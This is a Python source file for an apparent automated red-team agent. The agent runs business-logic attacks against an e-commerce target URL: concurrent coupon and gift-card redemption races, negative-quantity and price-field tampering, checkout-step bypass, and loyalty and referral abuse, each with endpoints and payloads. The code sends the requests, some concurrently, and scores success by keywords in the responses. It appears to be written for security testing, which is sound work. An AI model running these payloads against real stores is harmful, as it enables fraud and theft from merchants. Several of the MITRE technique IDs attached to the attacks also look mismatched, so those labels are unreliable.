from typing import List, Dict, Any, Optional
from datetime import datetime
from uuid import UUID
import structlog
import httpx
import random

from agents.schemas import EpisodeContext, RedTeamAction
from agents.rag.memory import RAGMemory

logger = structlog.get_logger(__name__)


BUSINESS_LOGIC_TECHNIQUES = [
    {
        "technique_id": "T1485",
        "name": "Race Condition - Coupon Double Apply",
        "owasp_category": "A04",
        "attack_type": "race_condition_coupon",
        "endpoints": [
            "/api/cart/apply-coupon",
            "/rest/checkout/coupon",
            "/api/v1/orders/coupon",
        ],
        "payload": {"coupon_code": "SAVE50"},
        "concurrent_requests": 10,
        "description": "Apply same coupon multiple times concurrently",
    },
    {
        "technique_id": "T1485",
        "name": "Race Condition - Gift Card Balance",
        "owasp_category": "A04",
        "attack_type": "race_condition_giftcard",
        "endpoints": [
            "/api/giftcard/redeem",
            "/rest/giftcard/use",
            "/api/v1/giftcards/redeem",
        ],
        "payload": {"code": "GC123456"},
        "concurrent_requests": 5,
        "description": "Redeem gift card multiple times concurrently",
    },
    {
        "technique_id": "T1548.002",
        "name": "Price Manipulation - Negative Quantity",
        "owasp_category": "A04",
        "attack_type": "price_manipulation_negative_qty",
        "endpoints": [
            "/api/cart/update",
            "/rest/cart/item",
            "/api/v1/cart/update",
        ],
        "payloads": [
            {"item_id": "1", "quantity": -10},
            {"item_id": "1", "quantity": -1},
            {"product_id": "1", "qty": -999},
        ],
        "description": "Add negative quantities to reduce cart total or get credit",
    },
    {
        "technique_id": "T1548.002",
        "name": "Price Manipulation - Hidden Field Tampering",
        "owasp_category": "A04",
        "attack_type": "price_manipulation_hidden_field",
        "endpoints": [
            "/api/checkout/place-order",
            "/rest/order/create",
            "/api/v1/orders/create",
        ],
        "payloads": [
            {"items": [{"id": "1", "price": 0.01}]},
            {"total": 0.01, "currency": "USD"},
            {"amount": 1, "items": []},
        ],
        "description": "Manipulate price/total in hidden form fields",
    },
    {
        "technique_id": "T1599.001",
        "name": "Business Logic - Free Item via Bundle Bypass",
        "owasp_category": "A04",
        "attack_type": "bundle_bypass",
        "endpoints": [
            "/api/cart/add-bundle",
            "/rest/bundle/purchase",
            "/api/v1/bundles/buy",
        ],
        "payloads": [
            {"bundle_id": "premium", "items": [{"id": "1", "qty": 0}]},
            {"bundle": "starter", "skip_validation": True},
        ],
        "description": "Bypass bundle validation to get premium items free",
    },
    {
        "technique_id": "T1599.002",
        "name": "Business Logic - Inventory Exhaustion",
        "owasp_category": "A04",
        "attack_type": "inventory_exhaustion",
        "endpoints": [
            "/api/cart/add",
            "/rest/cart/add",
            "/api/v1/cart/add",
        ],
        "payload": {"item_id": "limited_item", "quantity": 999},
        "concurrent_requests": 20,
        "description": "Hold inventory by adding massive quantities to cart",
    },
    {
        "technique_id": "T1548.001",
        "name": "Business Logic - Loyalty Points Abuse",
        "owasp_category": "A04",
        "attack_type": "loyalty_points_abuse",
        "endpoints": [
            "/api/loyalty/redeem",
            "/rest/rewards/use",
            "/api/v1/points/redeem",
        ],
        "payloads": [
            {"points": -1000},
            {"points": 999999, "item": "premium"},
        ],
        "description": "Manipulate loyalty points for unauthorized redemptions",
    },
    {
        "technique_id": "T1548.003",
        "name": "Business Logic - Workflow Bypass",
        "owasp_category": "A04",
        "attack_type": "workflow_bypass",
        "endpoints": [
            "/api/checkout/step3",
            "/rest/order/confirm",
            "/api/v1/orders/finalize",
        ],
        "payloads": [
            {"skip_steps": ["payment", "shipping"]},
            {"force_complete": True},
        ],
        "description": "Skip required checkout steps (payment, address verification)",
    },
    {
        "technique_id": "T1599.003",
        "name": "Business Logic - Referral Program Abuse",
        "owasp_category": "A04",
        "attack_type": "referral_abuse",
        "endpoints": [
            "/api/referral/claim",
            "/rest/referral/redeem",
            "/api/v1/referrals/use",
        ],
        "payloads": [
            {"code": "REF123", "email": "attacker@test.com"},
            {"referrer": "attacker@test.com", "auto_claim": True},
        ],
        "description": "Create fake referrals or claim referral rewards multiple times",
    },
]


class BusinessLogicRedTeamAgent:
    def __init__(
        self,
        rag_memory: Optional[RAGMemory] = None,
        scenario: str = "business_logic",
        target_type: str = "custom",
    ):
        self.rag = rag_memory
        self.scenario = scenario
        self.target_type = target_type
        self.techniques = BUSINESS_LOGIC_TECHNIQUES
        self.technique_index = 0
        self.payload_index = 0
        self.client = httpx.AsyncClient(timeout=30.0, follow_redirects=True)

    async def select_action(self, state: EpisodeContext) -> Optional[RedTeamAction]:
        if self.technique_index >= len(self.techniques):
            logger.info("All business logic techniques exhausted", episode_id=str(state.episode_id))
            return None

        technique = self.techniques[self.technique_index]

        if "payloads" in technique:
            if self.payload_index >= len(technique["payloads"]):
                self.technique_index += 1
                self.payload_index = 0
                return await self.select_action(state)
            payload = technique["payloads"][self.payload_index]
            self.payload_index += 1
        else:
            payload = technique.get("payload", {})

        target_endpoint = self._select_endpoint(technique, state)
        concurrent = technique.get("concurrent_requests", 1)

        action = RedTeamAction(
            technique_id=technique["technique_id"],
            owasp_category=technique["owasp_category"],
            attack_type=technique["attack_type"],
            target_endpoint=target_endpoint,
            http_method="POST",
            payload=payload,
            headers={"Content-Type": "application/json"},
            expected_behavior=technique["description"],
            metadata={"concurrent_requests": concurrent}
        )

        return action

    def _select_endpoint(self, technique: Dict[str, Any], state: EpisodeContext) -> str:
        endpoints = technique.get("endpoints", ["/api/cart/update"])
        endpoint = random.choice(endpoints)
        return f"{state.target_url.rstrip('/')}{endpoint}"

    async def execute_action(self, action: RedTeamAction, target_url: str) -> Dict[str, Any]:
        concurrent = action.metadata.get("concurrent_requests", 1) if hasattr(action, 'metadata') else 1

        try:
            full_url = action.target_endpoint
            if not full_url.startswith("http"):
                full_url = f"{target_url.rstrip('/')}{action.target_endpoint}"

            logger.info("Executing business logic attack", url=full_url, technique=action.technique_id, concurrent=concurrent)

            if concurrent > 1:
                return await self._execute_concurrent(full_url, action, concurrent)
            else:
                return await self._execute_single(full_url, action)

        except httpx.TimeoutException:
            return {"success": False, "error": "Timeout", "technique_id": action.technique_id}
        except httpx.ConnectError:
            return {"success": False, "error": "Connection failed", "technique_id": action.technique_id}
        except Exception as e:
            logger.error("Business logic execution error", technique=action.technique_id, error=str(e))
            return {"success": False, "error": str(e), "technique_id": action.technique_id}

    async def _execute_single(self, url: str, action: RedTeamAction) -> Dict[str, Any]:
        response = await self.client.post(url, json=action.payload, headers=action.headers)
        success = self._check_business_logic_success(response, action.attack_type)
        return self._build_result(response, action, success)

    async def _execute_concurrent(self, url: str, action: RedTeamAction, count: int) -> Dict[str, Any]:
        import asyncio

        async def single_request():
            try:
                resp = await self.client.post(url, json=action.payload, headers=action.headers)
                return resp
            except Exception:
                return None

        tasks = [single_request() for _ in range(count)]
        responses = await asyncio.gather(*tasks, return_exceptions=True)

        successful = [r for r in responses if r and not isinstance(r, Exception) and r.status_code == 200]
        success = len(successful) > 1 if action.attack_type.startswith("race_condition") else len(successful) > 0

        first_resp = successful[0] if successful else responses[0]
        if isinstance(first_resp, Exception) or first_resp is None:
            return {"success": False, "error": "All requests failed", "technique_id": action.technique_id}

        return self._build_result(first_resp, action, success, concurrent_count=len(successful))

    def _check_business_logic_success(self, response: httpx.Response, attack_type: str) -> bool:
        if response.status_code >= 400:
            return False

        body = response.text.lower()

        if "race_condition" in attack_type:
            return "applied" in body or "success" in body or response.status_code == 200

        elif "price_manipulation" in attack_type:
            return any(kw in body for kw in ["total", "0.0", "0.01", "negative", "discount", "credit"])

        elif attack_type == "bundle_bypass":
            return any(kw in body for kw in ["bundle", "premium", "free", "added"])

        elif attack_type == "inventory_exhaustion":
            return "added" in body or "cart" in body

        elif attack_type == "loyalty_points_abuse":
            return any(kw in body for kw in ["redeemed", "points", "success"])

        elif attack_type == "workflow_bypass":
            return any(kw in body for kw in ["order", "confirmed", "complete", "success"])

        elif attack_type == "referral_abuse":
            return any(kw in body for kw in ["claimed", "referral", "bonus", "reward"])

        return False

    def _build_result(self, response: httpx.Response, action: RedTeamAction, success: bool, concurrent_count: int = 1) -> Dict[str, Any]:
        return {
            "success": success,
            "status_code": response.status_code,
            "response_body": response.text[:2000] if response.text else "",
            "response_headers": dict(response.headers),
            "technique_id": action.technique_id,
            "attack_type": action.attack_type,
            "timestamp": datetime.utcnow().isoformat(),
            "concurrent_requests": concurrent_count,
        }

    async def close(self):
        await self.client.aclose()